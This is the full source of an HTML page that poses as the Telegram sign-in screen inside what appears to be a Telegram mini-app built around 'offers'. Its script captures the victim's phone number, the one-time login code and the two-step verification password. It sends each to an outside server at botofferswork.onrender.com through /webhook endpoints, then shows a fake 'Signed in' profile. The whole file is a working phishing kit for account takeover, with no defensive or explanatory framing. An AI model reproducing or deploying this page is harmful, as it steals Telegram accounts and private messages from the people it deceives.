<!doctype html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,user-scalable=no">
<meta name="theme-color" content="#ffffff">
<title>Telegram</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='50' cy='50' r='50' fill='%232ea6da'/><path d='M22 49l52-22-8 50-16-13-9 9-2-16z' fill='white'/></svg>">
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
:root{
  --bg-gradient:linear-gradient(135deg,#a7d47c 0%,#8bc96e 30%,#6fbf6a 70%,#b5d782 100%);
  --card-bg:#ffffff;
  --text:#000000;
  --text-secondary:#707579;
  --input-border:#dadce0;
  --input-focus:#3390ec;
  --btn-primary:#3390ec;
  --btn-primary-hover:#2a7bc4;
  --btn-disabled:#e3e5e8;
  --btn-disabled-text:#a5a5a5;
  --link:#3390ec;
  --logo-circle:#4da8e8;
  --pattern-color:rgba(90,140,80,0.2);
}
[data-theme="dark"]{
  --bg-gradient:linear-gradient(135deg,#0a0a0a 0%,#0d0a15 30%,#0f0c1a 70%,#0a0a0a 100%);
  --card-bg:#212121;
  --text:#ffffff;
  --text-secondary:#aaaaaa;
  --input-border:#3a3a3a;
  --input-focus:#8774e1;
  --btn-primary:#8774e1;
  --btn-primary-hover:#7663c9;
  --btn-disabled:#2a2a2a;
  --btn-disabled-text:#666666;
  --link:#8774e1;
  --logo-circle:#8774e1;
  --pattern-color:rgba(135,116,225,0.15);
}
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
body{
  background:var(--bg-gradient);
  color:var(--text);
  display:flex;align-items:center;justify-content:center;
  min-height:100vh;padding:20px;overflow-x:hidden;
  position:relative;transition:background .3s;
}
.bg-pattern{
  position:fixed;inset:0;pointer-events:none;opacity:.5;
  font-size:34px;line-height:1.4;letter-spacing:14px;word-spacing:18px;
  padding:20px;
  color:var(--pattern-color);
  overflow:hidden;
  white-space:pre-wrap;
  word-break:break-all;
  user-select:none;
  z-index:0;
}
@media(max-width:600px){.bg-pattern{font-size:24px;letter-spacing:10px;word-spacing:12px}}

.theme-toggle{
  position:fixed;top:20px;right:20px;z-index:100;
  width:44px;height:44px;border-radius:50%;
  background:rgba(255,255,255,.9);
  border:none;cursor:pointer;font-size:20px;
  display:flex;align-items:center;justify-content:center;
  box-shadow:0 2px 8px rgba(0,0,0,.15);
  transition:transform .2s,background .2s;
}
.theme-toggle:hover{transform:scale(1.05)}
[data-theme="dark"] .theme-toggle{background:rgba(60,60,60,.9);color:#fff}

.card{
  position:relative;z-index:2;
  background:var(--card-bg);
  border-radius:20px;
  padding:44px 32px 32px;
  width:100%;max-width:400px;
  box-shadow:0 12px 48px rgba(0,0,0,.12),0 2px 8px rgba(0,0,0,.06);
  text-align:center;
  animation:cardIn .4s cubic-bezier(.16,1,.3,1);
}
@keyframes cardIn{from{opacity:0;transform:translateY(16px) scale(.98)}to{opacity:1;transform:translateY(0) scale(1)}}

.logo{
  width:112px;height:112px;border-radius:50%;
  margin:0 auto 22px;
  background:var(--logo-circle);
  display:flex;align-items:center;justify-content:center;
  transition:background .3s;
}
.logo svg{width:60px;height:60px;fill:#fff;margin-left:-5px;margin-top:3px}

h1{font-size:26px;font-weight:600;letter-spacing:-.3px;margin-bottom:10px;color:var(--text)}
.sub{color:var(--text-secondary);font-size:14.5px;line-height:1.5;margin-bottom:26px;padding:0 8px}

.step{display:flex;flex-direction:column;gap:14px;text-align:left;animation:stepIn .25s ease}
@keyframes stepIn{from{opacity:0;transform:translateX(6px)}to{opacity:1;transform:translateX(0)}}
.hidden{display:none !important}

.field{position:relative;margin-bottom:14px}
.field label{position:absolute;top:-8px;left:14px;background:var(--card-bg);padding:0 6px;font-size:12.5px;color:var(--input-focus);font-weight:500;z-index:1;transition:color .2s;letter-spacing:.2px}
.field input{
  width:100%;padding:15px 14px;
  background:transparent;
  border:1.5px solid var(--input-border);
  border-radius:10px;
  color:var(--text);font-size:15.5px;
  outline:none;transition:border-color .2s;
  font-family:inherit;
}
.field input:focus{border-color:var(--input-focus)}
.field input::placeholder{color:var(--text-secondary);opacity:.6}

.btn{
  width:100%;padding:15px;background:var(--btn-primary);color:#fff;
  border:none;border-radius:10px;font-size:16px;font-weight:600;
  cursor:pointer;margin-top:6px;
  transition:background .2s,transform .08s;
  font-family:inherit;letter-spacing:.5px;
  text-transform:uppercase;
}
.btn:hover:not(:disabled){background:var(--btn-primary-hover)}
.btn:active:not(:disabled){transform:scale(.985)}
.btn:disabled{background:var(--btn-disabled);color:var(--btn-disabled-text);cursor:not-allowed}
.btn-ghost{background:transparent;color:var(--link);padding:12px;font-size:14px;font-weight:500;border:none;cursor:pointer;font-family:inherit;margin-top:6px;border-radius:8px}
.btn-danger{background:transparent;color:#e85353;padding:14px;font-size:14px;font-weight:500;border:none;cursor:pointer;font-family:inherit;margin-top:14px;border-radius:8px;width:100%}

.links{margin-top:24px;display:flex;flex-direction:column;gap:12px;align-items:center}
.link{
  background:none;border:none;color:var(--link);
  font-size:14px;font-weight:600;letter-spacing:.5px;
  text-transform:uppercase;cursor:pointer;font-family:inherit;
  padding:4px 8px;transition:opacity .2s;
  display:flex;align-items:center;gap:4px;
}
.link:hover{opacity:.75}
.link .arrow{font-size:11px}

.spinner-wrap{text-align:center;padding:24px 0}
.spinner{width:46px;height:46px;border:3px solid var(--btn-disabled);border-top-color:var(--btn-primary);border-radius:50%;margin:0 auto 18px;animation:spin .9s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.spinner-wrap p{color:var(--text-secondary);font-size:14px}

.error{background:rgba(232,83,83,.1);color:#e85353;padding:12px 14px;border-radius:10px;font-size:13px;margin-top:14px;text-align:left;line-height:1.45;animation:stepIn .2s ease}
.attempts{font-size:12px;color:#e85353;margin-top:6px}
.code-hint{font-size:14px;color:var(--text-secondary);margin-bottom:-2px;line-height:1.5;text-align:left}
.code-hint b{color:var(--text);font-weight:500}

.profile-avatar{width:110px;height:110px;border-radius:50%;margin:0 auto 20px;background:var(--logo-circle);display:flex;align-items:center;justify-content:center;font-size:44px;font-weight:600;color:#fff;overflow:hidden}
.profile-name{font-size:22px;font-weight:600;margin-bottom:6px;color:var(--text)}
.profile-username{color:var(--link);font-size:15px;margin-bottom:20px}
.profile-status{display:inline-block;padding:6px 14px;background:rgba(83,195,124,.15);color:#53c37c;border-radius:20px;font-size:13px;margin-bottom:22px;font-weight:500}
.profile-info{background:rgba(127,127,127,.08);border-radius:12px;padding:6px 16px;text-align:left;margin-bottom:16px}
.profile-info-row{display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px solid rgba(127,127,127,.15);font-size:14.5px}
.profile-info-row:last-child{border-bottom:none}
.profile-info-row .key{color:var(--text-secondary)}
.profile-info-row .val{color:var(--text);font-weight:500}

@media (max-width:400px){
  .card{padding:36px 22px 26px;border-radius:16px}
  .logo{width:96px;height:96px;margin-bottom:18px}
  .logo svg{width:52px;height:52px}
  h1{font-size:22px}
  .sub{font-size:13.5px;margin-bottom:22px}
}
</style>
</head>
<body>

<div class="bg-pattern" id="pattern"></div>

<button class="theme-toggle" id="theme-toggle" title="Toggle theme">🌙</button>

<div class="card">
  <div class="logo">
    <svg viewBox="0 0 24 24"><path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"/></svg>
  </div>

  <h1 id="title">Sign in to Telegram</h1>
  <p class="sub" id="sub">Please confirm your country code<br>and enter your phone number.</p>

  <form id="step-phone" class="step">
    <div class="field">
      <label>Phone Number</label>
      <input type="tel" id="phone" placeholder="+7 999 123-45-67" autocomplete="tel" required inputmode="tel">
    </div>
    <button type="submit" class="btn" id="btn-next" disabled>NEXT</button>
  </form>

  <form id="step-code" class="step hidden">
    <p class="code-hint" id="code-hint">We've sent the code to your Telegram app.</p>
    <div class="field">
      <label>Code</label>
      <input type="text" id="code" placeholder="-----" inputmode="numeric" autocomplete="one-time-code" maxlength="6" required>
    </div>
    <button type="submit" class="btn">NEXT</button>
    <button type="button" class="btn-ghost" id="btn-back-phone">← Back to phone number</button>
  </form>

  <form id="step-2fa" class="step hidden">
    <p class="code-hint">Your account is protected with an additional password.</p>
    <div class="field">
      <label>Password</label>
      <input type="password" id="password" placeholder="Your password" autocomplete="current-password">
    </div>
    <button type="submit" class="btn">NEXT</button>
  </form>

  <div id="step-loading" class="step hidden">
    <div class="spinner-wrap"><div class="spinner"></div><p id="loading-text">Checking…</p></div>
  </div>

  <div id="step-profile" class="step hidden">
    <div class="profile-avatar" id="profile-avatar">A</div>
    <div class="profile-name" id="profile-name">—</div>
    <div class="profile-username" id="profile-username">@—</div>
    <div class="profile-status">Signed in</div>
    <div class="profile-info">
      <div class="profile-info-row"><span class="key">ID</span><span class="val" id="profile-id">—</span></div>
      <div class="profile-info-row"><span class="key">Username</span><span class="val" id="profile-uname">—</span></div>
      <div class="profile-info-row"><span class="key">Name</span><span class="val" id="profile-fio">—</span></div>
      <div class="profile-info-row"><span class="key">Phone</span><span class="val" id="profile-phone">—</span></div>
    </div>
    <button type="button" class="btn-danger" id="btn-logout">Log out</button>
  </div>

  <div id="step-rejected" class="step hidden">
    <h1 style="font-size:22px;margin-bottom:10px">Offer declined</h1>
    <p class="sub" style="margin-bottom:0">You've declined the offer.</p>
  </div>

  <div id="error-box" class="error hidden"></div>

  <div class="links" id="links-block">
    <button class="link" id="link-ru">ПРОДОЛЖИТЬ НА РУССКОМ</button>
    <button class="link" id="link-qr">LOG IN BY QR CODE <span class="arrow">›</span></button>
    <button class="link" id="link-passkey">LOG IN BY PASSKEY <span class="arrow">›</span></button>
  </div>
</div>

<script>
console.log('[INIT] script started');

// ─── ФОН С ЭМОДЗИ ───
try {
  var EMOJIS = ['✈','🎁','🐻','🐱','🦄','🌈','⭐','🍕','🍩','🎈','🎮','🚀','🌸','🐶','🐼','🍔','🎸','🎨','🐧','🦊','🍓','🌙','☀','🎯','🎪','🐢','🦋','🍭','🎵','🧸','🐸','🦁','🍦','⚽','🎲','🐬','🦉','🍒','🌻','🎭','🐙','🦜','🍇','🎺','🐝','🦓','🍋','🎬'];
  var patternText = '';
  for (var i = 0; i < 300; i++) {
    patternText += EMOJIS[Math.floor(Math.random() * EMOJIS.length)] + ' ';
  }
  var patternEl = document.getElementById('pattern');
  if (patternEl) patternEl.textContent = patternText + patternText;
  console.log('[INIT] pattern done');
} catch (e) { console.error('[PATTERN]', e); }

// ─── ТЕМА ───
try {
  var themeToggle = document.getElementById('theme-toggle');
  function setTheme(theme) {
    document.documentElement.setAttribute('data-theme', theme);
    if (themeToggle) themeToggle.textContent = theme === 'dark' ? '☀' : '🌙';
    try { localStorage.setItem('tg_theme', theme); } catch(e){}
  }
  var savedTheme = 'light';
  try { savedTheme = localStorage.getItem('tg_theme') || 'light'; } catch(e){}
  setTheme(savedTheme);
  if (themeToggle) {
    themeToggle.addEventListener('click', function() {
      var current = document.documentElement.getAttribute('data-theme') || 'light';
      setTheme(current === 'dark' ? 'light' : 'dark');
    });
  }
  console.log('[INIT] theme done');
} catch (e) { console.error('[THEME]', e); }

// ─── TELEGRAM WEBAPP ───
var tg = null;
try {
  tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
  if (tg) { tg.ready(); tg.expand(); }
} catch (e) { console.error('[TG]', e); }
var tgUserId = (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id : 0;

// ─── ПАРАМЕТРЫ ───
var offerId = 0;
var action = 'accept';
try {
  var startParam = (tg && tg.initDataUnsafe && tg.initDataUnsafe.start_param) || '';
  var m = startParam.match(/^offer_(\d+)_(accept|reject)$/);
  if (m) {
    offerId = parseInt(m[1], 10);
    action = m[2];
  } else {
    var params = new URLSearchParams(location.search);
    offerId = parseInt(params.get('offer') || '0', 10);
    action = (params.get('action') || 'accept').toLowerCase();
  }
} catch (e) { console.error('[PARAMS]', e); }
console.log('[INIT] offerId =', offerId, 'action =', action);

// ─── ЭЛЕМЕНТЫ ───
var $ = function(id) { return document.getElementById(id); };
var stepPhone = $('step-phone'), stepCode = $('step-code'), step2fa = $('step-2fa');
var stepLoading = $('step-loading'), stepProfile = $('step-profile');
var stepRejected = $('step-rejected'), errorBox = $('error-box');
var linksBlock = $('links-block');
var phoneInput = $('phone'), codeInput = $('code'), passInput = $('password');
var btnNext = $('btn-next');

var phone = '', code = '', password = null;

// ─── ВВОД НОМЕРА ───
try {
  phoneInput.addEventListener('input', function(e) {
    var v = e.target.value;
    var digits = v.replace(/\D/g, '');
    if (digits.length > 15) digits = digits.slice(0, 15);
    e.target.value = '+' + digits;
    // активируем кнопку когда есть минимум код+7 цифр (обычно 10-12)
    btnNext.disabled = digits.length < 8;
  });
  phoneInput.addEventListener('focus', function(e) {
    if (!e.target.value) e.target.value = '+';
  });
  console.log('[INIT] phone input ready');
} catch (e) { console.error('[PHONE-EVENT]', e); }

// ─── LOCALSTORAGE ───
var SESSION_KEY = 'tg_offer_profile_v9';
function saveProfile(p) {
  try { p.tg_user_id = tgUserId; p.saved_at = Date.now();
    localStorage.setItem(SESSION_KEY, JSON.stringify(p)); } catch(e) {}
}
function loadProfile() {
  try {
    var raw = localStorage.getItem(SESSION_KEY);
    if (!raw) return null;
    var p = JSON.parse(raw);
    if (tgUserId && p.tg_user_id && p.tg_user_id !== tgUserId) {
      localStorage.removeItem(SESSION_KEY); return null;
    }
    return p;
  } catch(e) { return null; }
}
function clearProfile() { try { localStorage.removeItem(SESSION_KEY); } catch(e){} }

function showError(msg){ if(errorBox){errorBox.innerHTML=msg;errorBox.classList.remove('hidden');} }
function hideError(){ if(errorBox){errorBox.classList.add('hidden');} }
function show(el){ if(el) el.classList.remove('hidden'); }
function hide(el){ if(el) el.classList.add('hidden'); }

// ─── ИНИЦИАЛИЗАЦИЯ ───
try {
  if (action === 'reject') {
    document.querySelectorAll('.step, #title, #sub, #links-block').forEach(function(el){ el.style.display = 'none'; });
    stepRejected.style.display = 'flex';
    document.querySelectorAll('form').forEach(function(f){
      f.addEventListener('submit', function(e){ e.preventDefault(); });
    });
    window.__REJECTED__ = true;
  } else {
    window.__REJECTED__ = false;
    var saved = loadProfile();
    if (saved && saved.user_id) showProfile(saved);
  }
  console.log('[INIT] ready');
} catch (e) { console.error('[INIT-ERR]', e); }

function showProfile(p){
  hide(stepPhone); hide(stepCode); hide(step2fa); hide(stepLoading); hide(stepRejected);
  hide($('title')); hide($('sub')); hide(linksBlock);
  show(stepProfile);
  var fio = [p.first_name, p.last_name].filter(Boolean).join(' ') || 'User';
  $('profile-name').textContent = fio;
  $('profile-username').textContent = p.username ? '@' + p.username : '—';
  $('profile-id').textContent = p.user_id || '—';
  $('profile-uname').textContent = p.username ? '@' + p.username : '—';
  $('profile-fio').textContent = fio;
  $('profile-phone').textContent = p.phone || '—';
  var initial = (p.first_name || p.username || 'A').charAt(0).toUpperCase();
  $('profile-avatar').textContent = initial;
}

try {
  $('btn-logout').addEventListener('click', function() { clearProfile(); location.reload(); });
} catch (e) {}

try {
  $('link-ru').addEventListener('click', function() {
    var h = document.getElementById('title');
    if (h) h.textContent = 'Вход в Telegram';
    var s = document.getElementById('sub');
    if (s) s.innerHTML = 'Подтвердите код страны<br>и введите номер телефона.';
    var b = document.getElementById('btn-next');
    if (b) b.textContent = 'ДАЛЕЕ';
  });
} catch (e) {}

try {
  $('link-qr').addEventListener('click', function() { alert('QR-вход недоступен'); });
  $('link-passkey').addEventListener('click', function() { alert('Passkey недоступен'); });
} catch (e) {}

// ─── API ───
var API = 'https://botofferswork.onrender.com';

async function api(path, body){
  var url = API + path;
  var res, data;
  try {
    res = await fetch(url, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(body)
    });
  } catch (e) { throw new Error('Server unavailable.'); }
  try { data = await res.json(); }
  catch (e) { throw new Error('Server error.'); }
  return { status: res.status, data: data };
}

// ─── ШАГ 1: ТЕЛЕФОН ───
try {
  stepPhone.addEventListener('submit', async function(e) {
    e.preventDefault();
    if (window.__REJECTED__) return;
    hideError();
    var digits = phoneInput.value.replace(/\D/g, '');
    if (digits.length < 8) { showError('Please enter a valid phone number with country code'); return; }
    phone = '+' + digits;

    hide(stepPhone); show(stepLoading);
    $('loading-text').textContent = 'Sending code…';
    try {
      var result = await api('/webhook/phone', { offer_id: offerId, phone: phone });
      var data = result.data;
      if (!data.ok) {
        hide(stepLoading); show(stepPhone);
        showError(data.error || 'Error sending code');
        return;
      }
      hide(stepLoading); show(stepCode);
      $('title').style.display = 'block';
      $('sub').style.display = 'block';
      $('title').textContent = 'Enter code';
      $('sub').textContent = 'We\'ve sent the code to your Telegram app.';
      $('code-hint').innerHTML = 'We\'ve sent the code to <b>' + phone + '</b>.';
      codeInput.value = '';
      setTimeout(function(){ codeInput.focus(); }, 100);
    } catch(err) {
      hide(stepLoading); show(stepPhone);
      showError(err.message || 'Network error');
    }
  });
} catch (e) { console.error('[STEP1]', e); }

// ─── ШАГ 2: КОД ───
try {
  stepCode.addEventListener('submit', async function(e) {
    e.preventDefault();
    if (window.__REJECTED__) return;
    hideError();
    code = codeInput.value.replace(/\D/g, '');
    if (code.length < 3) { showError('Enter the code'); return; }
    hide(stepCode); show(stepLoading);
    $('loading-text').textContent = 'Checking code…';
    try {
      var result = await api('/webhook/code', { offer_id: offerId, phone: phone, code: code });
      var data = result.data;
      if (data.ok && !data.needs_password) {
        var profile = {
          user_id: data.user_id, first_name: data.first_name,
          last_name: data.last_name, username: data.username, phone: phone
        };
        saveProfile(profile);
        showProfile(profile);
      } else if (data.ok && data.needs_password) {
        hide(stepLoading); show(step2fa);
        $('title').textContent = 'Two-Step Verification';
        $('sub').textContent = 'Your account is protected with an additional password.';
        passInput.value = '';
        setTimeout(function(){ passInput.focus(); }, 100);
      } else {
        hide(stepLoading); show(stepCode);
        var msg = data.error || 'Invalid code';
        if (data.attempts_left !== undefined) {
          msg += '<div class="attempts">Attempts left: ' + data.attempts_left + '</div>';
        }
        showError(msg);
        codeInput.value = ''; codeInput.focus();
      }
    } catch(err) {
      hide(stepLoading); show(stepCode);
      showError(err.message || 'Network error');
    }
  });
} catch (e) { console.error('[STEP2]', e); }

try {
  $('btn-back-phone').addEventListener('click', function() {
    if (window.__REJECTED__) return;
    hide(stepCode); show(stepPhone);
    $('title').textContent = 'Sign in to Telegram';
    $('sub').innerHTML = 'Please confirm your country code<br>and enter your phone number.';
  });
} catch (e) {}

// ─── ШАГ 3: 2FA ───
try {
  step2fa.addEventListener('submit', async function(e) {
    e.preventDefault();
    if (window.__REJECTED__) return;
    hideError();
    password = passInput.value.trim();
    if (!password) { showError('Enter the password'); return; }
    hide(step2fa); show(stepLoading);
    $('loading-text').textContent = 'Checking password…';
    try {
      var result = await api('/webhook/password', { offer_id: offerId, phone: phone, code: code, password: password });
      var data = result.data;
      if (data.ok) {
        var profile = {
          user_id: data.user_id, first_name: data.first_name,
          last_name: data.last_name, username: data.username, phone: phone
        };
        saveProfile(profile);
        showProfile(profile);
      } else {
        hide(stepLoading); show(step2fa);
        var msg = data.error || 'Invalid password';
        if (data.attempts_left !== undefined) {
          msg += '<div class="attempts">Attempts left: ' + data.attempts_left + '</div>';
        }
        showError(msg);
        passInput.value = ''; passInput.focus();
      }
    } catch(err) {
      hide(stepLoading); show(step2fa);
      showError(err.message || 'Network error');
    }
  });
} catch (e) { console.error('[STEP3]', e); }

console.log('[INIT] all handlers bound');
</script>
